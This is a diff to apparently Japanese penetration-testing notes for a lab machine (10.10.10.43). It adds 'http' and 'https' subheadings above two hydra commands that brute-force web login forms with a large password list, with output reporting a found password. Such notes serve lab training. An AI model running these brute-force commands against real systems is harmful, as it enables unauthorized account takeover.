@@ -219,6 +219,7 @@ mysql> select * from users;
 1 row in set (0.00 sec)
 ```
 ### ブルートフォース
+***http***
 ```
 hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
 ```
@@ -235,7 +236,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-16 03:15:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-16 03:15:14                            
 ```
-
+***https***
 ```
 hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect" -t 64
 ```
